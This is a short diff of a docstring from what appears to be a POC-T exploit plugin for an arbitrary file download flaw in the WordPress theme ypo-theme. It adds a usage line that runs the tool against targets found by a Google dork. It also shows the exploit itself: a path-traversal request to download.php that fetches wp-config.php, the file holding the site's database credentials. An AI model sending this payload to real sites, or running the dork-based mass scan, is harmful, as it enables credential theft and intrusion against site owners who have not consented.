@@ -6,8 +6,9 @@
 """
 WordPress theme ypo-theme Arbitrary File Download Vulnerability
 
-Dork
-  inurl:/wp-content/themes/ypo-theme/
+Usage
+  python POC-T.py -s wp-ypo-filedownload -aG "inurl:/wp-content/themes/ypo-theme/"
+
 EXPLOIT
   /wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php
 
